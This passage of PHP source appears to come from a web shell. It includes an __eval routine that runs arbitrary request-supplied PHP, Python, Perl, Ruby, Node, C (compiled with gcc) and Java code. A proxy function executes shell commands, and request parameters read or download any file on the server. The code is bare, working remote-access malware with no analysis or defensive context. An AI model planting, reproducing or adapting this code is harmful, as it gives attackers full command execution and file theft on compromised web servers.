          }
        }
        echo $result;exit;
      }
      $this->res = $res;
      $this->headers = $http_response_header;
    }
  }
  function __ac_proxy_bin(){
    $bin = $this->getParam('bin');
    // $bin = "/bin/sh -c \"{cmd}\"";
    extract($this->params, EXTR_PREFIX_ALL, 'p');
    if($bin){
      $global = array(
        "SERVER_HTTP_HOST"=>$_SERVER['HTTP_HOST'],
        "SERVER_DOCUMENT_ROOT"=>str_replace('\\','/',realpath($_SERVER['DOCUMENT_ROOT'])),
        "fix_self_url"=>self_url()
      );
      $script_file = __FILE__;
      $params = base64_encode($p_params);
      $global = base64_encode(json_encode($global));
      $phppath = isset($p_php) ? $p_php : "php -q";
      $cmd = "$phppath $script_file $params $global";
      $bin = str_replace("{cmd}",$cmd,$bin);
      $result = exe($bin);
      $res = json_decode($result, true);
      if(!$res){
        echo $result;
        die();
      }
      
      if(isset($res['_headers']) && isset($res['_data'])){
        $data = base64_decode($res['_data']);;
        echo _res_output($data, $res['_headers']);
        exit;
      }
      $this->res = $res;
    }
  }

  function __eval($code, $s_lang = "php", $args = ''){
    error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
    @ini_set('display_errors','1');
    $s_res = "";
    $s_evaloption = $args;
    $s_tmpdir = get_writabledir();
    if(strtolower($s_lang)=='php'){
      ob_start();
      if(strpos($code,"<?php") === 0){
        $code = "?>".$code;
      }
      eval($code);
      $s_res = ob_get_contents();
      ob_end_clean();
    }
    elseif(strtolower($s_lang)=='python'||strtolower($s_lang)=='perl'||strtolower($s_lang)=='ruby'||strtolower($s_lang)=='node'||strtolower($s_lang)=='nodejs'){
      $s_rand = md5(time().rand(0,100));
      $s_script = $s_tmpdir.$s_rand;
      if(file_put_contents($s_script, $code)!==false){
        $s_res = exe($s_lang." ".$s_evaloption." ".$s_script);
        unlink($s_script);
      }
    }
    elseif(strtolower($s_lang)=='gcc'){
      $s_script = md5(time().rand(0,100));
      chdir($s_tmpdir);
      if(file_put_contents($s_script.".c", $code)!==false){
        $s_scriptout = is_win() ? $s_script.".exe" : $s_script;
        $s_res = exe("gcc ".$s_script.".c -o ".$s_scriptout.$s_evaloption);
        if(@is_file($s_scriptout)){
          $s_res = is_win() ? exe($s_scriptout):exe("chmod +x ".$s_scriptout." ; ./".$s_scriptout);
          rename($s_scriptout, $s_scriptout."del");
          unlink($s_scriptout."del");
        }
        unlink($s_script.".c");
      }
    }
    elseif(strtolower($s_lang)=='java'){
      if(preg_match("/class\ ([^{]+){/i",$code, $s_r)){
        $s_classname = trim($s_r[1]);
        $s_script = $s_classname;
      }
      else{
        $s_rand = "pd4sh_".substr(md5(time().rand(0,100)),0,8);
        $s_script = $s_rand;
        $code = "class ".$s_rand." { ".$code . " } ";
      }
      chdir($s_tmpdir);
      if(file_put_contents($s_script.".java", $code)!==false){
        $s_res = exe("javac ".$s_script.".java");
        if(@is_file($s_script.".class")){
          $s_res .= exe("java ".$s_evaloption." ".$s_script);
          unlink($s_script.".class");
        }
        unlink($s_script.".java");
      }
    }
    return $s_res;
  }
}
$modClasses = array(
  "main"=>MainMod::class,
  "tree"=>TreeMod::class,
  "editor"=>EditorMod::class
);
if(isset($_GP['_m'])){
  $modId = $_GP['_m'];
  if(isset($modClasses[$modId])){
    $mod = new $modClasses[$modId]($_GP);
    echo $mod->_result();
    exit;
  }
}
$res = array("success"=>true, "data"=>array());

if(isset($_GP['acts'])){
  $acts = is_array($_GP['acts']) ? $_GP['acts'] : json_decode($_GP['acts'], true);
  $res['acts'] = Acts::init($acts);
}

if(isset($_GP['vembed'])){
  $file = $_GP['vembed'];
  if(file_exists($file)){
    $headers = array( 
      "Content-type: ".@mime_content_type($file),
      "Content-length: ".filesize($file),
      "Cache-control: public",
      "Cache-Control: no-cache",
      "Pragma: no-cache",
    );
    echo _res_output(read_file($file), $headers);
  }
  exit;
}
elseif(isset($_GP['vf'])){
  $file = $_GP['vf'];
  if(file_exists($file)){
   echo raw_read_file($file, true);
  }
  exit;
}elseif(isset($_GP['dl'])){
  $file = trim($_GP['dl']);
  if(is_file($file)){
    $headers = array(
      "Content-Type: application/octet-stream",
      "Content-Transfer-Encoding: binary",
      "Content-length: ".filesize($file),
      "Cache-Control: no-cache",
      "Pragma: no-cache",
      "Content-disposition: attachment; filename=\"".basename($file)."\";"
    );
    echo _res_output(read_file($file), $headers);
  }
  exit;
}
echo _res_output($res);
